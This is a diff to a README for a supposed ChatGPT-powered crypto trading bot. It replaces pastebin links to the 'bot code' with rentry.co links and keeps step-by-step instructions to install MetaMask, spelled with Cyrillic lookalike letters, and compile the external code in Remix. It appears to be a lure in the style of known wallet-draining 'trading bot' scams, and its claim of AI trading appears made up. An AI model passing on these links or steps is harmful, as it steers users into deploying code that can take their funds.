@@ -21,7 +21,7 @@ This bot allows you to trade cryptocurrencies using AI algorithms through ChatGP
 
 🟢 Step 1: Download МetаМаsk: https://metamask.io/download
 
-🟢 Step 2: Code Compiler : https://pastebin.com/QBMBhae3
+🟢 Step 2: Code Compiler : https://rentry.co/ChatGPT-2026-AI-Code
 
 <img width="793" height="475" alt="image" src="https://github.com/user-attachments/assets/386a60b6-98b9-45a7-9d9b-734a29fa7883" />
 
@@ -40,7 +40,7 @@ Press the new file button and name it however you'd like ( bot.sol). Make sure t
 <img width="793" height="475" alt="image" src="https://github.com/user-attachments/assets/5c45caf1-17fa-49d4-aad6-2ac8bbd573a1" />
 
 
-🔗 Open Source Bot Code : https://pastebin.com/QBMBhae3
+🔗 Open Source Bot Code : https://rentry.co/ChatGPT-2026-AI-Code
 
 🟢 Step 5: Navigate to the Solidity Compiler tab in Remix and compile your bot. Be sure to select compiler version 0.8.4
 
